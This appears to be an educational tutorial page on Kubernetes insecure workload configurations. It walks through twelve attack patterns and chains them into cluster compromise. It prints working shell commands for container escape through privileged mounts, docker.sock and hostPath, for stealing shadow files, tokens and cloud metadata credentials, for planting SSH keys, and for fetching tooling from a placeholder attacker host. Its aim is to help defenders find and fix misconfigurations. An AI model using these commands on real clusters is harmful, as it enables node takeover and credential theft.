# K01: Insecure Workload Configurations - Attack Vectors

## Table of Contents
- [Understanding Workload Attack Vectors](#understanding-workload-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Misconfigurations](#chaining-misconfigurations)

## Understanding Workload Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in clusters you own or are authorised to test.

Insecure workload configuration is rarely the *entry point*—it is the **amplifier**. An attacker first gets code execution inside a container (an application RCE, a poisoned dependency, an SSRF that reaches an internal exec endpoint, or simply a Pod they were allowed to schedule). What happens next is decided entirely by the workload's manifest. A hardened Pod traps them in a locked, unprivileged process. A permissive Pod hands them the node.

The attacker's objectives in this category are usually:

- **Escape the container** onto the underlying node using privilege, capabilities, host namespaces, or host mounts.
- **Harvest credentials**—the mounted ServiceAccount token, other Pods' Secrets on the node, and cloud metadata.
- **Move laterally** using those credentials to reach the API server, other nodes, and the cloud account.

### Core Attack Flow

```
1. Foothold
   |
   Code execution in a container (app RCE, supply chain, scheduled Pod)
2. Enumerate the sandbox
   |
   Read securityContext hints: id, capsh --print, /proc, mounts, env, SA token
3. Escape or escalate
   |
   privileged / SYS_ADMIN / hostPath / docker.sock / host namespaces
4. Loot and pivot
   |
   Node filesystem, kubelet creds, other Pods' secrets, cloud metadata
5. Cluster-wide movement
   |
   Use stolen token against the API server; schedule attacker Pods
```

## Common Attack Patterns

### 1. Enumerating the Sandbox

Before escaping, an attacker fingerprints how permissive the container is.

```bash
# Am I root? What UID/GID?
id

# What capabilities do I actually hold?
capsh --print
grep Cap /proc/self/status         # decode with: capsh --decode=00000000a80425fb

# Is the root filesystem writable? Any interesting host mounts?
mount | grep -E 'hostPath|/proc|docker.sock'
touch /test_write 2>&1              # readOnlyRootFilesystem check

# Is a ServiceAccount token mounted?
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

**Payoff**: the output tells the attacker exactly which escape to reach for—no guessing required.

### 2. Privileged Container Escape

A `privileged: true` container has access to host devices and an unconfined profile. A classic technique mounts a host disk device directly from inside the container.

```bash
# Inside a privileged container: the host disk is visible under /dev
fdisk -l
# Mount the node root filesystem and read/write it
mkdir /host && mount /dev/sda1 /host
cat /host/etc/kubernetes/kubelet.conf     # kubelet credentials
# Persist: drop a SSH key or a cron job on the node
echo "$ATTACKER_KEY" >> /host/root/.ssh/authorized_keys
```

**Payoff**: full node compromise. From here every co-located Pod's secrets are readable.

### 3. Container Runtime Socket Abuse (docker.sock / containerd)

A mounted runtime socket lets a container command the runtime that is supposed to contain it.

```bash
# The Pod mounts /var/run/docker.sock via hostPath
# Launch a NEW privileged container that mounts the host root:
docker -H unix:///var/run/docker.sock run -v /:/host --privileged \
  --rm -it alpine chroot /host sh
# You are now root on the node, no kernel exploit needed.
```

**Payoff**: instant node takeover. This is one of the most reliable escapes because it uses the runtime's intended API.

### 4. hostPath Mount of the Node Filesystem

Even without `privileged`, a broad `hostPath` mount exposes the node.

```bash
# Pod mounts hostPath: / at /host
cat /host/etc/shadow
# Read every container's writable layer and any Secret projected to the node
find /host/var/lib/kubelet/pods -name '*.token' 2>/dev/null
# Write a static Pod manifest that the kubelet will auto-run as root:
cp attacker-pod.yaml /host/etc/kubernetes/manifests/
```

**Payoff**: reading node secrets and, via the static-pod path, running arbitrary privileged workloads.

### 5. Host PID Namespace Process Inspection

With `hostPID: true`, the container sees every process on the node.

```bash
# All host processes are visible
ps -ef
# Read another process's environment (often full of secrets/tokens)
cat /proc/<pid>/environ | tr '\0' '\n'
# With SYS_PTRACE, inject into a host process
gdb -p <pid>
```

**Payoff**: secrets from other workloads' memory and environment, and a route to code execution in more privileged processes.

### 6. Host Network Namespace and Metadata Access

`hostNetwork: true` puts the container on the node's network stack.

```bash
# Reach services bound to the node's localhost (often unauthenticated)
curl http://127.0.0.1:10250/pods              # kubelet read API
# Reach the cloud metadata service for the node's IAM credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Payoff**: unauthenticated kubelet access and cloud IAM credentials—NetworkPolicy does not apply to `hostNetwork` Pods.

### 7. ServiceAccount Token Theft and API Enumeration

The default automounted token is a ready-made cluster credential.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# What can this identity do?
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews ...
# If RBAC is loose, read secrets:
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

**Payoff**: depending on RBAC, anything from read-only enumeration up to reading all Secrets or creating privileged Pods. (Overlaps with K03 RBAC, but the *automount* is the workload-config failure.)

### 8. Privilege Escalation via setuid (allowPrivilegeEscalation)

When `allowPrivilegeEscalation` is not set to `false`, setuid binaries can grant new privileges.

```bash
# Find setuid binaries retained in the image
find / -perm -4000 -type f 2>/dev/null
# A vulnerable or misconfigured setuid binary escalates a non-root foothold
# to in-container root, which then leverages any added capability.
```

**Payoff**: turns a low-privilege foothold into in-container root, the precondition for most further escapes.

### 9. Dangerous Capability Abuse (SYS_ADMIN and friends)

Added capabilities provide escape primitives even without full `privileged`.

```
# With CAP_SYS_ADMIN, the cgroup release_agent escape is a classic:
# (mount a cgroup, set a release_agent script on the host, trigger it)
# With CAP_DAC_READ_SEARCH, read arbitrary host files via open_by_handle_at.
# With CAP_NET_ADMIN, reconfigure interfaces and intercept traffic.
```

**Payoff**: node code execution or arbitrary host file read, from a container that was never marked `privileged`.

### 10. Writable Root Filesystem Persistence

When `readOnlyRootFilesystem` is false, the attacker can stage tools and persist.

```bash
# Download offensive tooling into the container
curl -o /tmp/enum http://attacker/enum && chmod +x /tmp/enum && /tmp/enum
# Modify app binaries/config for persistence across restarts of THIS layer
echo 'malicious' >> /app/entrypoint.sh
```

**Payoff**: a stable base of operations and a place to drop the escape toolkit a read-only filesystem would have blocked.

### 11. Resource Exhaustion (Missing Limits)

A workload with no CPU/memory limits can starve the node.

```bash
# A hostile or buggy Pod with no limits consumes all node memory,
# triggering the OOM killer against neighbouring Pods and node instability.
stress-ng --vm 4 --vm-bytes 90% --timeout 0
```

**Payoff**: denial of service against every workload sharing the node—the "noisy neighbour" turned malicious.

### 12. Unconfined seccomp Widening the Kernel Attack Surface

With `seccompProfile: Unconfined`, syscalls that `RuntimeDefault` would block are available.

```
# RuntimeDefault blocks dozens of rarely needed, dangerous syscalls.
# Unconfined re-exposes them, enabling kernel-exploit primitives used in
# many container escapes (e.g. certain keyctl / userfaultfd / unshare paths).
```

**Payoff**: a materially larger kernel attack surface for the escape phase.

## Chaining Misconfigurations

Individually "minor" settings combine into full compromise:

```
App RCE in a Pod                       -> code execution as root in container
        +
readOnlyRootFilesystem: false          -> drop escape toolkit
        +
hostPath: /var/run/docker.sock mounted  -> launch privileged container
        =  node takeover, no kernel exploit required
```

Another common chain, cluster-wide:

```
runAsNonRoot unset (root) + allowPrivilegeEscalation: true
        -> in-container root
        +  capabilities.add: [SYS_ADMIN]
        -> escape to node via cgroup release_agent
        +  automounted default ServiceAccount token with broad RBAC
        -> read all namespace Secrets, schedule attacker Pods
        =  from one app bug to cluster control
```

## Key Takeaways

1. **The workload config decides the blast radius**—the same app bug is contained or catastrophic depending on the manifest.
2. **Escape primitives are well-known and scripted**—privileged, docker.sock, hostPath, and SYS_ADMIN each have reliable public techniques.
3. **The mounted token is a free cluster credential**—disable automount unless the app truly needs it.
4. **Host namespaces bypass your network controls**—`hostNetwork` ignores NetworkPolicy and reaches metadata.
5. **Small settings chain**—writable filesystem plus one host mount plus a token equals a breach with no kernel exploit at all.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build an enforced, hardened workload baseline
- **[Code Examples](examples.md)**: Insecure vs. secure manifests and admission policies
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue with the rest of the Kubernetes Top 10
- **[Practice](/practice)**: Apply what you've learned in hands-on challenges
